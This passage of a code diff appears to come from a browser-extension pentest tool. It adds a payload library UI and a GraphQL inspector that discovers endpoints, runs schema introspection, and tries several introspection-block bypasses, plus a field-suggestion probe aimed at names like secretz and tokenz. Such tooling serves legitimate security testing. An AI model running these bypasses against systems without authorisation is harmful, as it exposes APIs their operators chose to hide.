+    toast('Payload added', 'success');
+  },
+
+  orderedRows(cat, rows) {
+    const order = state.payloadGroupOrders[cat] || [];
+    if (!order.length) return rows;
+    const byValue = new Map(rows.map(r => [r.value, r]));
+    return [
+      ...order.map(v => byValue.get(v)).filter(Boolean),
+      ...rows.filter(r => !order.includes(r.value)),
+    ];
+  },
+
+  async reorderPayload(cat, draggedValue, targetValue) {
+    if (!draggedValue || !targetValue || draggedValue === targetValue) return;
+    const group = this.allCats().find(c => c.cat === cat);
+    if (!group) return;
+    const rows = this.orderedRows(cat, [
+      ...(group.payloads || []).map(p => ({ value: p })),
+      ...(group.customPayloads || []).map(p => ({ value: p })),
+    ]);
+    const from = rows.findIndex(r => r.value === draggedValue);
+    const to = rows.findIndex(r => r.value === targetValue);
+    if (from < 0 || to < 0) return;
+    const [moved] = rows.splice(from, 1);
+    rows.splice(to, 0, moved);
+    state.payloadGroupOrders[cat] = rows.map(r => r.value);
+    await chrome.storage.local.set({ payloadGroupOrders: state.payloadGroupOrders });
+    this.render();
+  },
+
+  async deletePayload(cat, customIdx) {
+    const group = state.customPayloadCats.find(c => c.cat === cat);
+    if (!group) return;
+    const removed = group.payloads[customIdx];
+    group.payloads.splice(customIdx, 1);
+    if (!group.payloads.length) {
+      state.customPayloadCats = state.customPayloadCats.filter(c => c !== group);
+    }
+    state.payloadGroupOrders[cat] = (state.payloadGroupOrders[cat] || []).filter(v => v !== removed);
+    await chrome.storage.local.set({ customPayloadCats: state.customPayloadCats, payloadGroupOrders: state.payloadGroupOrders });
+    this.renderCustomList();
+    this.render();
+    toast('Payload removed', 'success');
+  },
+
+  renderCustomList() {
+    const el = $('payload-custom-list');
+    if (!el) return;
+    if (!state.customPayloadCats.length) {
+      el.innerHTML = '<div class="muted" style="font-size:12px">No custom payload groups</div>';
+      return;
+    }
+    const builtInNames = new Set(PAYLOAD_CATS.filter(c => c.cat !== 'GraphQL (GET)').map(c => c.cat));
+    el.innerHTML = state.customPayloadCats.map(c => `
+      <div class="payload-custom-row">
+        <span><b>${esc(c.cat)}</b> ${(builtInNames.has(c.cat) || c.cat === 'GraphQL (GET)') ? '<span class="badge">ADDED TO BUILT-IN</span>' : '<span class="badge">CUSTOM</span>'} <span class="muted">(${c.payloads.length})</span></span>
+        <button class="sm" data-action="payload-edit-custom" data-id="${c.id}">Edit</button>
+        <button class="sm danger" data-action="payload-delete-custom" data-id="${c.id}">Delete</button>
+      </div>
+    `).join('');
+  },
 
   render() {
     const out = $('payload-output');
     if (!out) return;
     const q = this.filter.toLowerCase();
     let html = '';
-    PAYLOAD_CATS.forEach(({ cat, payloads }, idx) => {
+    this.allCats().forEach(({ cat, payloads, custom, customPayloads = [] }, idx) => {
+      const rows = [
+        ...payloads.map(p => ({ value: p, source: 'built-in' })),
+        ...customPayloads.map((p, customIdx) => ({ value: p, source: 'custom', customIdx })),
+      ];
+      const orderedRows = this.orderedRows(cat, rows);
+      const displayRows = orderedRows.map(r => ({ ...r, displayValue: this.displayValue(cat, r.value) }));
       const visible = q
-        ? payloads.filter(p => p.toLowerCase().includes(q) || cat.toLowerCase().includes(q))
-        : payloads;
+        ? displayRows.filter(r => r.displayValue.toLowerCase().includes(q) || r.value.toLowerCase().includes(q) || cat.toLowerCase().includes(q))
+        : displayRows;
       if (!visible.length) return;
+      const methodToggle = cat === 'GraphQL'
+        ? `<span class="payload-method-toggle" role="group" aria-label="GraphQL payload method">
+            <button class="payload-method-btn${this.graphQLPayloadMethod() === 'POST' ? ' active' : ''}" data-action="payload-graphql-method" data-method="POST" type="button">POST</button>
+            <button class="payload-method-btn${this.graphQLPayloadMethod() === 'GET' ? ' active' : ''}" data-action="payload-graphql-method" data-method="GET" type="button">GET</button>
+          </span>`
+        : '';
       html += `<div class="recon-section">
-        <h4>${esc(cat)} <span class="dim">(${visible.length})</span>
-          <button class="payload-copy-all recon-copy-btn" data-idx="${idx}" title="Copy all">Copy all</button>
-        </h4>
-        <div class="payload-list">`;
-      visible.forEach(p => {
-        html += `<div class="payload-row">
-          <span class="payload-text" title="${esc(p)}">${esc(p)}</span>
-          <button class="payload-copy-one recon-copy-btn" data-val="${esc(p)}" title="Copy">⧉</button>
-        </div>`;
+	        <h4>${esc(cat)}${custom ? ' <span class="badge">CUSTOM</span>' : ''} <span class="dim">(${visible.length})</span>
+	          ${methodToggle}
+	          <button class="payload-copy-all recon-copy-btn" data-idx="${idx}" title="Copy all">Copy all</button>
+	        </h4>
+	        <div class="payload-list" data-cat="${esc(cat)}">`;
+      visible.forEach(row => {
+        html += `<div class="payload-row" draggable="true" data-cat="${esc(cat)}" data-val="${esc(row.value)}">
+	          <span class="payload-drag-handle" title="Drag to reorder"></span>
+	          <span class="payload-text" title="${esc(row.displayValue)}">${esc(row.displayValue)}${row.source === 'custom' ? ' <span class="badge">ADDED</span>' : ''}</span>
+	          <div class="payload-actions">
+	            ${row.source === 'custom' ? `
+	              <button class="payload-delete-one recon-copy-btn" data-cat="${esc(cat)}" data-custom-idx="${row.customIdx}" title="Delete">Delete</button>
+	            ` : ''}
+	            <button class="payload-copy-one recon-copy-btn" data-val="${esc(row.displayValue)}" title="Copy">Copy</button>
+	            <button class="payload-copy-urlencoded recon-copy-btn" data-val="${esc(row.displayValue)}" title="Copy URL encoded">URL Enc</button>
+	            <button class="payload-send-encode recon-copy-btn" data-val="${esc(row.displayValue)}" title="Send to Encode / Decode">Encode</button>
+	          </div>
+	        </div>`;
       });
-      html += `</div></div>`;
+      html += `</div>
+        <div class="payload-add-row">
+          <input class="payload-add-input" data-cat="${esc(cat)}" placeholder="Add payload to ${esc(cat)}" autocomplete="off">
+          <button class="payload-add-btn primary" data-cat="${esc(cat)}" type="button">Add Payload</button>
+        </div>
+      </div>`;
     });
     if (!html) html = '<div class="muted" style="padding:16px;font-size:13px">No payloads match</div>';
     out.innerHTML = html;
@@ -2581,13 +3869,13 @@ async function importCookies(file) {
     if (!c.name || !c.domain) continue;
     const scheme = c.secure ? 'https' : 'http';
     const host   = c.domain.startsWith('.') ? c.domain.slice(1) : c.domain;
-    const cookie = {
+    const cookie = buildCookieSetDetails({
       url:      `${scheme}://${host}${c.path || '/'}`,
       name:     c.name, value: c.value || '',
       domain:   c.domain, path: c.path || '/',
       httpOnly: !!c.httpOnly, secure: !!c.secure,
-      sameSite: c.sameSite || 'no_restriction',
-    };
+      sameSite: c.sameSite || 'unspecified',
+    });
     if (c.expirationDate) cookie.expirationDate = c.expirationDate;
     const { error } = await bg('SET_COOKIE', { cookie });
     if (!error) ok++;
@@ -2623,10 +3911,888 @@ async function importProfiles(file) {
   toast(`Imported: ${roles.length} roles, ${uaProfiles.length} UA, ${proxyProfiles.length} proxy, ${headerProfiles.length} header profiles`, 'success');
 }
 
+
+// ─── GraphQL Inspector ────────────────────────────────────────────────────────
+
+const GraphQL = (() => {
+  const INTROSPECTION_GQL = '{__schema{queryType{name}mutationType{name}subscriptionType{name}types{kind name description fields(includeDeprecated:true){name description isDeprecated args{name type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}inputFields{name type{kind name ofType{kind name}}}enumValues(includeDeprecated:true){name description isDeprecated}possibleTypes{name}}directives{name description locations args{name type{kind name}}}}}';
+  const INTROSPECTION_OP_QUERY = 'query IntrospectionQuery ' + INTROSPECTION_GQL;
+  const COMMON_ENDPOINT_PATHS = ['/graphql', '/api/graphql', '/v1/graphql', '/gql'];
+
+  let _endpoints = [];
+  let _endpointDetails = new Map();
+
+  function spectreDetectGraphQL() {
+    const domValues = [];
+    const addDomValue = (value, source) => {
+      if (value) domValues.push({ value: String(value), source });
+    };
+    document.querySelectorAll('script:not([src])').forEach(s => addDomValue(s.textContent, 'inline script'));
+    document.querySelectorAll('script[src]').forEach(s => addDomValue(s.src, 'script src'));
+    document.querySelectorAll('a[href],form[action],link[href],iframe[src]').forEach(el => {
+      addDomValue(el.href || el.action || el.src, el.tagName.toLowerCase());
+    });
+    document.querySelectorAll('[data-url],[data-uri],[data-endpoint],[data-graphql],[data-gql],[data-path],[data-route]').forEach(el => {
+      ['url','uri','endpoint','graphql','gql','path','route'].forEach(k => addDomValue(el.dataset?.[k], `data-${k}`));
+    });
+    let resources = [];
+    try { resources = performance.getEntriesByType('resource').map(r => r.name).filter(Boolean); } catch {}
+    const scripts = Array.from(document.querySelectorAll('script[src]')).map(s => s.src).filter(Boolean);
+    return {
+      href: location.href,
+      origin: location.origin,
+      domValues,
+      scripts: [...new Set([...scripts, ...resources.filter(u => /\.m?js(?:[?#]|$)/i.test(u))])].slice(0, 50),
+      resourceUrls: resources.slice(0, 250),
+    };
+  }
+
+  function scoreGraphQLCandidate(url, reason = '') {
+    let score = 1;
+    if (/graphql/i.test(url)) score += 8;
+    if (/(^|\/)gql(\/|$|[?#])/i.test(url)) score += 6;
+    if (/(^|\/)(query|api)(\/|$|[?#])/i.test(url)) score += 2;
+    if (/persisted|operationName|__schema|__type|IntrospectionQuery/i.test(reason)) score += 5;
+    return score;
+  }
+
+  function rememberCandidate(found, rawUrl, base, source, reason) {
+    const abs = absolutizeUrl(rawUrl, base);
+    if (!abs || !isHttpUrl(abs)) return;
+    let url;
+    try {
+      const parsed = new URL(abs);
+      if (parsed.searchParams.has('query') || parsed.searchParams.has('operationName') || parsed.searchParams.has('extensions')) {
+        parsed.search = '';
+      }
+      parsed.hash = '';
+      url = parsed.href;
+    } catch { return; }
+    const item = found.get(url) || { url, sources: new Set(), reasons: new Set(), score: 0 };
+    item.sources.add(source || 'scan');
+    item.reasons.add(reason || 'GraphQL hint');
+    item.score += scoreGraphQLCandidate(url, reason);
+    item.guess = item.guess ?? source === 'common path';
+    if (source !== 'common path') item.guess = false;
+    found.set(url, item);
+  }
+
+  function graphQLReason(raw, context = '') {
+    const hay = `${raw}\n${context}`;
+    if (/\/graphql(?:\/|$|[?#])|graphqlEndpoint|graphQLEndpoint/i.test(hay)) return 'GraphQL path';
+    if (/(^|\/)gql(?:\/|$|[?#])|gqlEndpoint/i.test(hay)) return 'GQL path';
+    if (/[?&]query=|[?&]operationName=|persistedQuery/i.test(raw)) return 'GraphQL request URL';
+    if (/__schema|__type|IntrospectionQuery/i.test(hay)) return 'Introspection query nearby';
+    if (/(apollo|urql|relay|GraphQLClient|createHttpLink|HttpLink|graphql-request)/i.test(context) && /(?:^|\/)(api|query)(?:\/|$|[?#])/i.test(raw)) return 'GraphQL client endpoint';
+    return null;
+  }
+
+  function scanTextForGraphQL(text, base, source, found) {
+    if (!text) return;
+    const patterns = [
+      /https?:\/\/[^\s"'`<>)\\]+/gi,
+      /["'`]((?:\/|\.\.?\/|[A-Za-z0-9_-]+\/)(?:[^"'`<>{}\\]|\\.){1,240})["'`]/g,
+      /(?:uri|url|endpoint|graphqlEndpoint|graphQLEndpoint|gqlEndpoint|path|route)\s*[:=]\s*["'`]([^"'`]{1,240})["'`]/gi,
+    ];
+    patterns.forEach(re => {
+      for (const m of text.matchAll(re)) {
+        const raw = (m[1] || m[0] || '').replace(/\\\//g, '/').trim();
+        const context = text.slice(Math.max(0, (m.index || 0) - 140), (m.index || 0) + raw.length + 180);
+        const reason = graphQLReason(raw, context);
+        if (reason) rememberCandidate(found, raw, base, source, reason);
+      }
+    });
+  }
+
+  async function collectEndpointCandidates(pageInfo) {
+    const found = new Map();
+    const pageUrl = pageInfo?.href || state.tabUrl;
+    const origin = pageInfo?.origin || (() => { try { return new URL(pageUrl).origin; } catch { return ''; } })();
+    COMMON_ENDPOINT_PATHS.forEach(p => rememberCandidate(found, p, origin, 'common path', 'Common GraphQL endpoint'));
+    (pageInfo?.domValues || []).forEach(({ value, source }) => scanTextForGraphQL(value, pageUrl, source, found));
+    (pageInfo?.resourceUrls || []).forEach(value => scanTextForGraphQL(value, pageUrl, 'loaded resource', found));
+
+    const pageResp = await bg('FETCH', { url: pageUrl, maxBody: 500000 }).catch(() => null);
+    if (pageResp?.body) scanTextForGraphQL(pageResp.body, pageUrl, 'page source', found);
+
+    const scripts = [...new Set(pageInfo?.scripts || [])].slice(0, 35);
+    for (const scriptUrl of scripts) {
+      const resp = await bg('FETCH', { url: scriptUrl, maxBody: 900000 }).catch(() => null);
+      if (resp?.body) scanTextForGraphQL(resp.body, scriptUrl, scriptUrl, found);
+    }
+
+    return [...found.values()]
+      .sort((a, b) => b.score - a.score || a.url.localeCompare(b.url))
+      .slice(0, 60)
+      .map(item => ({
+        url: item.url,
+        sources: [...item.sources].slice(0, 3),
+        reasons: [...item.reasons].slice(0, 3),
+        guess: item.guess,
+        score: item.score,
+      }));
+  }
+
+  function describeEndpoint(url) {
+    const info = _endpointDetails.get(url);
+    if (!info) return '';
+    const bits = [];
+    if (info.probe?.label) bits.push(info.probe.label);
+    bits.push(...(info.reasons || []), ...(info.sources || []));
+    const details = [...new Set(bits)].slice(0, 5);
+    return details.length ? `<div class="graphql-candidate-meta">${esc(details.join(' | '))}</div>` : '';
+  }
+
+  function endpointBadge(info) {
+    const status = info?.probe?.status || (info?.guess ? 'guess' : 'found');
+    const label = {
+      confirmed: 'CONFIRMED',
+      possible: 'POSSIBLE',
+      blocked: 'BLOCKED',
+      found: 'FOUND',
+      guess: 'GUESS',
+      missing: 'MISSING',
+      error: 'ERROR',
+    }[status] || status.toUpperCase();
+    return `<span class="badge graphql-endpoint-status ${esc(status)}">${esc(label)}</span>`;
+  }
+
+  function isGraphQLResponse(data, body, headers = {}) {
+    const ctype = headers['content-type'] || headers['Content-Type'] || '';
+    if (data && typeof data === 'object' && ('data' in data || 'errors' in data)) return true;
+    return /graphql|json/i.test(ctype) && /"errors"|"data"|Cannot query field|GraphQL|Did you mean/i.test(body || '');
+  }
+
+  function classifyProbeResponse(res, method) {
+    if (res.error) return { status: 'error', label: `Probe ${method}: ${res.error}` };
+    const code = Number(res.status || 0);
+    const body = res.body || '';
+    let data = null;
+    try { data = JSON.parse(body); } catch {}
+    if (isGraphQLResponse(data, body, res.headers || {})) {
+      if (data?.data?.__typename || data?.data || data?.errors?.length) {
+        return { status: 'confirmed', label: `GraphQL response via ${method} (${code || 'ok'})`, httpStatus: code };
+      }
+      return { status: 'possible', label: `GraphQL-like response via ${method} (${code || 'ok'})`, httpStatus: code };
+    }
+    if ([401, 403].includes(code)) return { status: 'blocked', label: `Endpoint exists but returned HTTP ${code}`, httpStatus: code };
+    if ([400, 405, 415].includes(code) && /query|graphql|json|method|POST|GET/i.test(body)) {
+      return { status: 'possible', label: `GraphQL-like HTTP ${code} via ${method}`, httpStatus: code };
+    }
+    if (code === 404) return { status: 'missing', label: `HTTP 404 via ${method}`, httpStatus: code };
+    if (code >= 500) return { status: 'possible', label: `Server error HTTP ${code} via ${method}`, httpStatus: code };
+    return { status: 'missing', label: code ? `No GraphQL signal via ${method} (HTTP ${code})` : `No response signal via ${method}`, httpStatus: code };
+  }
+
+  async function probeEndpoint(url) {
+    const body = JSON.stringify({ query: '{__typename}' });
+    const post = classifyProbeResponse(await bg('FETCH', {
+      url,
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body,
+      maxBody: 25000,
+    }).catch(e => ({ error: String(e) })), 'POST');
+    if (['confirmed', 'blocked', 'possible'].includes(post.status)) return post;
+
+    const getUrl = url + (url.includes('?') ? '&' : '?') + 'query=' + encodeURIComponent('{__typename}');
+    const get = classifyProbeResponse(await bg('FETCH', { url: getUrl, method: 'GET', maxBody: 25000 }).catch(e => ({ error: String(e) })), 'GET');
+    return ['confirmed', 'blocked', 'possible'].includes(get.status) ? get : post;
+  }
+
+  async function probeEndpointCandidates(candidates, output) {
+    const probed = [];
+    const total = candidates.length;
+    for (const [idx, candidate] of candidates.entries()) {
+      output.innerHTML = `<div class="muted">Probing GraphQL candidates (${idx + 1}/${total})…</div>`;
+      const probe = await probeEndpoint(candidate.url);
+      probed.push({ ...candidate, probe });
+    }
+    const rank = { confirmed: 0, blocked: 1, possible: 2, found: 3, guess: 4, missing: 5, error: 6 };
+    return probed
+      .filter(c => c.probe.status !== 'missing' || !c.guess)
+      .sort((a, b) => (rank[a.probe.status] ?? 9) - (rank[b.probe.status] ?? 9) || b.score - a.score || a.url.localeCompare(b.url));
+  }
+
+  let _currentUrl = '';
+  let _types = [];
+
+  function typeStr(t) {
+    if (!t) return '?';
+    if (t.kind === 'NON_NULL') return typeStr(t.ofType) + '!';
+    if (t.kind === 'LIST') return '[' + typeStr(t.ofType) + ']';
+    return t.name || '?';
+  }
+
+  function argDefault(t, visited = new Set()) {
+    if (!t) return 'null';
+    if (t.kind === 'NON_NULL') return argDefault(t.ofType, visited);
+    if (t.kind === 'LIST') return '[]';
+    if (t.name === 'String') return '""';
+    if (t.name === 'Int' || t.name === 'Float') return '0';
+    if (t.name === 'Boolean') return 'false';
+    if (t.name === 'ID') return '""';
+    if (t.kind === 'ENUM') {
+      const enumType = _types.find(et => et.name === t.name);
+      const firstVal = enumType?.enumValues?.[0]?.name;
+      return firstVal || 'null';
+    }
+    if (t.kind === 'INPUT_OBJECT' && !visited.has(t.name)) {
+      const inputType = _types.find(it => it.name === t.name);
+      if (inputType?.inputFields?.length) {
+        const next = new Set([...visited, t.name]);
+        const fields = inputType.inputFields.map(f => `${f.name}: ${argDefault(f.type, next)}`).join(', ');
+        return `{${fields}}`;
+      }
+    }
+    return 'null';
+  }
+
+  function unwrapTypeName(t) {
+    if (!t) return null;
+    if (t.kind === 'NON_NULL' || t.kind === 'LIST') return unwrapTypeName(t.ofType);
+    return t.name;
+  }
+
+  function expandFields(typeName, indent = '    ', visited = new Set()) {
+    if (visited.has(typeName)) return `${indent}__typename`;
+    const type = _types.find(t => t.name === typeName);
+    if (!type?.fields?.length) return `${indent}__typename`;
+    const next = new Set([...visited, typeName]);
+    return type.fields.map(f => {
+      const baseName = unwrapTypeName(f.type);
+      const baseType = _types.find(t => t.name === baseName);
+      if (!baseType || baseType.kind === 'SCALAR' || baseType.kind === 'ENUM') {
+        return `${indent}${f.name}`;
+      } else if (baseType.kind === 'OBJECT' && indent.length <= 12) {
+        const nested = expandFields(baseName, indent + '  ', next);
+        return `${indent}${f.name} {\n${nested}\n${indent}}`;
+      } else {
+        return `${indent}${f.name} { __typename }`;
+      }
+    }).join('\n');
+  }
+
+  function buildQueryBody(fieldName, args, opType, returnTypeName) {
+    const argsStr = args?.length
+      ? '(' + args.map(a => `${a.name}: ${argDefault(a.type)}`).join(', ') + ')'
+      : '';
+    const keyword = opType === 'mutation' ? 'mutation' : 'query';
+    const fields = returnTypeName ? expandFields(returnTypeName) : '    __typename';
+    const q = `${keyword} {\n  ${fieldName}${argsStr} {\n${fields}\n  }\n}`;
+    return JSON.stringify({ query: q }, null, 2);
+  }
+
+  function sendToDispatch(url, body) {
+    const method = $('graphql-method')?.value || 'POST';
+    if (method === 'GET') {
+      let queryStr = body;
+      try { queryStr = JSON.parse(body).query ?? body; } catch {}
+      $('dispatch-url').value = url + (url.includes('?') ? '&' : '?') + 'query=' + encodeURIComponent(queryStr);
+      $('dispatch-method').value = 'GET';
+      $('dispatch-headers').value = '';
+      $('dispatch-body').value = '';
+      $$('#tab-dispatch .dispatch-tab-btn').forEach(b => b.classList.remove('active'));
+      document.querySelector('#tab-dispatch .dispatch-tab-btn[data-pane="headers"]')?.classList.add('active');
+      $('dispatch-headers').classList.remove('hidden');
+      $('dispatch-body').classList.add('hidden');
+    } else {
+      $('dispatch-url').value = url;
+      $('dispatch-method').value = 'POST';
+      $('dispatch-headers').value = 'Content-Type: application/json';
+      $('dispatch-body').value = body;
+      $$('#tab-dispatch .dispatch-tab-btn').forEach(b => b.classList.remove('active'));
+      document.querySelector('#tab-dispatch .dispatch-tab-btn[data-pane="body"]')?.classList.add('active');
+      $('dispatch-headers').classList.add('hidden');
+      $('dispatch-body').classList.remove('hidden');
+    }
+    activateTab('dispatch');
+    toast('Sent to Dispatch', 'success');
+  }
+
+  function renderFields(fields, opType = null) {
+    if (!fields?.length) return '<div class="graphql-field dim">No fields</div>';
+    return fields.map(f => {
+      const returnTypeName = opType ? unwrapTypeName(f.type) : null;
+      const dispatchBody = opType ? buildQueryBody(f.name, f.args, opType, returnTypeName) : null;
+      return `<div class="graphql-field${f.isDeprecated ? ' deprecated' : ''}" data-fname="${esc(f.name.toLowerCase())}">
+        <span class="graphql-fname">${esc(f.name)}</span>
+        <span class="graphql-ftype">${esc(typeStr(f.type))}</span>
+        ${f.args?.length ? `<span class="graphql-fargs">(${f.args.map(a => esc(a.name) + ': ' + esc(typeStr(a.type))).join(', ')})</span>` : ''}
+        ${f.isDeprecated ? '<span class="badge badge-warn">deprecated</span>' : ''}
+        ${f.description ? `<div class="graphql-fdesc dim">${esc(f.description)}</div>` : ''}
+        ${dispatchBody ? `<button class="recon-copy-btn gql-dispatch-btn" data-action="gql-field-dispatch" data-body="${esc(dispatchBody)}">&#8594; Dispatch</button>` : ''}
+      </div>`;
+    }).join('');
+  }
+
+  function section(title, count, body, extraClass = '') {
+    return `<div class="graphql-section${extraClass}">
+      <div class="graphql-section-header" data-action="graphql-toggle">
+        <span class="graphql-section-title">${esc(title)}</span>
+        <span class="badge">${count}</span>
+        <span class="recon-section-caret">&#9662;</span>
+      </div>
+      <div class="graphql-section-body">${body}</div>
+    </div>`;
+  }
+
+  function inferGraphQLError(data) {
+    if (!data?.errors?.length) return '';
+    return data.errors.map(e => e?.message || JSON.stringify(e)).filter(Boolean).join('\n');
+  }
+
+  function parseGraphQLResponse(res) {
+    if (res.error || !res.body) return { error: `Request failed: ${res.error || 'No response'}` };
+    try { return { data: JSON.parse(res.body) }; }
+    catch { return { error: 'Invalid JSON response — is this a GraphQL endpoint?' }; }
+  }
+
+  function schemaFromData(data) {
+    return data?.data?.__schema || null;
+  }
+
+  function typeProbeFromData(data) {
+    return data?.data?.__type || null;
+  }
+
+  function encodedJsonBody(payload) {
+    return JSON.stringify(payload).replace(/__/g, '\\u005f\\u005f');
+  }
+
+  function parseSuggestionNames(errors) {
+    const names = new Set();
+    (errors || []).forEach(err => {
+      const msg = err?.message || String(err || '');
+      const suggestionBlock = msg.match(/Did you mean ([\s\S]*?)(?:\?|$)/i)?.[1] || '';
+      for (const m of suggestionBlock.matchAll(/["'`]([_A-Za-z][_0-9A-Za-z]*)["'`]/g)) names.add(m[1]);
+    });
+    return [...names].sort((a, b) => a.localeCompare(b));
+  }
+
+  function buildSuggestionProbeBody() {
+    const probes = [
+      'accountz', 'adminz', 'allUserz', 'authz', 'billingz', 'commentz',
+      'configz', 'currentUserz', 'dashboardz', 'exportz', 'featurez',
+      'flagz', 'groupz', 'healthz', 'invoicez', 'loginz', 'logz',
+      'meez', 'memberz', 'messagez', 'nodez', 'orderz', 'organizationz',
+      'paymentz', 'permissionz', 'planez', 'policyz', 'productz', 'profilez',
+      'registerz', 'reportz', 'rolez', 'searchz', 'secretz', 'servicez',
+      'sessionz', 'settingz', 'statuz', 'subscriptionz', 'teamz', 'tokenz',
+      'updatePasswordz', 'uploadz', 'userz', 'viewerz', 'webhookz',
+    ];
+    return JSON.stringify({ query: `query SpectreFieldProbe {\n  ${probes.join('\n  ')}\n}` });
+  }
+
+  function renderSuggestionProbe(names, url, errors = []) {
+    _currentUrl = url;
+    const output = $('graphql-output');
+    const fields = names.map(name => ({
+      name,
+      type: { kind: 'SCALAR', name: 'Unknown' },
+      args: [],
+      description: 'Discovered from GraphQL validation suggestions',
+    }));
+    output.innerHTML = `
+      <div class="graphql-header">
+        <span class="graphql-endpoint-label">${esc(url)} <span class="dim">(partial — validation suggestions)</span></span>
+        <button class="recon-copy-btn gql-dispatch-btn" data-action="gql-to-dispatch">&#8594; Dispatch</button>
+      </div>
+      ${names.length ? section('Suggested Query Fields', names.length, renderFields(fields)) : '<div class="error-msg">No field suggestions were returned. The endpoint appears to block introspection and does not leak validation suggestions for the current probe set.</div>'}
+      ${errors.length ? section('Probe Errors', errors.length, errors.slice(0, 8).map(e => `<pre class="code-block">${esc(e?.message || JSON.stringify(e))}</pre>`).join('')) : ''}
+    `;
+  }
+
+  async function detect() {
+    const output = $('graphql-output');
+    output.innerHTML = '<div class="muted">Scanning page, resources, and JS bundles for GraphQL endpoints…</div>';
+    let pageInfo;
+    try { pageInfo = await execPage(spectreDetectGraphQL); }
+    catch (e) { output.innerHTML = `<div class="error-msg">${esc(e.message)}</div>`; return; }
+    const candidates = await collectEndpointCandidates(pageInfo);
+    if (!candidates.length) {
+      _endpoints = [];
+      _endpointDetails = new Map();
+      output.innerHTML = '<div class="muted">No GraphQL endpoint candidates found in the page, resources, or common paths.</div>';
+      return;
+    }
+    const probed = await probeEndpointCandidates(candidates, output);
+    _endpoints = probed.map(c => c.url);
+    _endpointDetails = new Map(probed.map(c => [c.url, c]));
+    const urlInput = $('graphql-url');
+    if (urlInput && _endpoints.length) urlInput.value = _endpoints[0];
+    output.innerHTML = `<div class="graphql-candidates">
+      <div class="section-label" style="margin-bottom:6px">Candidates — confirmed first, guesses only shown if useful</div>
+      ${_endpoints.length ? _endpoints.map(e => {
+        const info = _endpointDetails.get(e);
+        return `<div class="graphql-candidate" data-action="graphql-pick" data-url="${esc(e)}"><div class="graphql-candidate-main"><span>${esc(e)}</span>${endpointBadge(info)}</div>${describeEndpoint(e)}</div>`;
+      }).join('') : '<div class="muted">No live GraphQL candidates found. Common-path guesses were probed and filtered out.</div>'}
+    </div>`;
+  }
+
+  const BYPASSES = {
+    newline:   { label: 'Newline prefix',    gql: '\n  ' + INTROSPECTION_GQL },
+    opname:    { label: 'operationName',     body: JSON.stringify({ operationName: 'IntrospectionQuery', query: INTROSPECTION_OP_QUERY, variables: {} }) },
+    typename:  { label: '__type probe',      body: JSON.stringify({ query: '{__type(name:"Query"){name fields{name description type{name kind ofType{name kind}}}}}' }) },
+    minimal:   { label: 'Minimal schema',    gql: '{__schema{queryType{name}mutationType{name}types{name kind}}}' },
+    encoded:   { label: 'Encoded body',      body: encodedJsonBody({ query: INTROSPECTION_OP_QUERY, operationName: 'IntrospectionQuery' }) },
+    applgql:   { label: 'application/graphql content-type', rawBody: INTROSPECTION_GQL, headers: { 'Content-Type': 'application/graphql' } },
+    batch:     { label: 'Batch array',       body: JSON.stringify([{ query: INTROSPECTION_GQL }]), headers: { 'Content-Type': 'application/json' } },
+    formenc:   { label: 'Form-encoded body', rawBody: 'query=' + encodeURIComponent(INTROSPECTION_GQL), headers: { 'Content-Type': 'application/x-www-form-urlencoded' } },
+    suggest:   { label: 'Suggestion probe',  body: buildSuggestionProbeBody(), nonIntrospection: true },
+  };
+
+  const AUTO_INTROSPECTION_ATTEMPTS = [
+    { label: 'standard POST',              gql: INTROSPECTION_GQL },
+    { label: 'named operation',            body: JSON.stringify({ operationName: 'IntrospectionQuery', query: INTROSPECTION_OP_QUERY, variables: {} }) },
+    { label: 'minimal schema',             gql: BYPASSES.minimal.gql },
+    { label: 'newline prefix',             gql: BYPASSES.newline.gql },
+    { label: 'encoded body',               body: BYPASSES.encoded.body },
+    { label: 'application/graphql',        rawBody: BYPASSES.applgql.rawBody, headers: BYPASSES.applgql.headers },
+    { label: 'batch array',                body: BYPASSES.batch.body, headers: BYPASSES.batch.headers },
+    { label: 'form-encoded',               rawBody: BYPASSES.formenc.rawBody, headers: BYPASSES.formenc.headers },
+    { label: '__type probe',               body: BYPASSES.typename.body },
+  ];
+
+  async function runIntrospectFetch(url, gqlOverride, bodyOverride, methodOverride, headersOverride, rawBodyOverride) {
+    const method = methodOverride || $('graphql-method')?.value || 'POST';
+    const gql  = gqlOverride  ?? INTROSPECTION_GQL;
+    const body = rawBodyOverride ?? bodyOverride ?? JSON.stringify({ query: gql });
+    let getUrl = url;
+    if (method === 'GET') {
+      let query = gql;
+      const params = new URLSearchParams();
+      try {
+        const parsed = JSON.parse(body);
+        query = parsed.query || query;
+        if (parsed.operationName) params.set('operationName', parsed.operationName);
+        if (parsed.variables && Object.keys(parsed.variables).length) params.set('variables', JSON.stringify(parsed.variables));
+        if (parsed.extensions) params.set('extensions', JSON.stringify(parsed.extensions));
+      } catch {}
+      params.set('query', query);
+      getUrl = url + (url.includes('?') ? '&' : '?') + params.toString();
+    }
+    const defaultHeaders = headersOverride || { 'Content-Type': 'application/json' };
+    const fetchOpts = method === 'GET'
+      ? { url: getUrl, method: 'GET', maxBody: 2000000 }
+      : { url, method: 'POST', headers: defaultHeaders, body, maxBody: 2000000 };
+    return bg('FETCH', fetchOpts);
+  }
+
+  function showBypassOptions(output, errMsg) {
+    output.innerHTML = `
+      <div class="error-msg">${esc(errMsg)}</div>
+      <div class="graphql-bypass-panel">
+        <div class="section-label">Introspection blocked — try a bypass:</div>
+        <button class="recon-copy-btn gql-bypass-btn" data-bypass="newline">Newline prefix</button>
+        <button class="recon-copy-btn gql-bypass-btn" data-bypass="opname">operationName field</button>
+        <button class="recon-copy-btn gql-bypass-btn" data-bypass="minimal">Minimal schema</button>
+        <button class="recon-copy-btn gql-bypass-btn" data-bypass="encoded">Encoded body</button>
+        <button class="recon-copy-btn gql-bypass-btn" data-bypass="applgql">application/graphql</button>
+        <button class="recon-copy-btn gql-bypass-btn" data-bypass="batch">Batch array</button>
+        <button class="recon-copy-btn gql-bypass-btn" data-bypass="formenc">Form-encoded</button>
+        <button class="recon-copy-btn gql-bypass-btn" data-bypass="get">Switch to GET</button>
+        <button class="recon-copy-btn gql-bypass-btn" data-bypass="typename">Probe __type only</button>
+        <button class="recon-copy-btn gql-bypass-btn" data-bypass="suggest">Suggestion enum</button>
+      </div>`;
+  }
+
+  function renderTypeProbe(typeData, url) {
+    _currentUrl = url;
+    const output = $('graphql-output');
+    output.innerHTML = `
+      <div class="graphql-header">
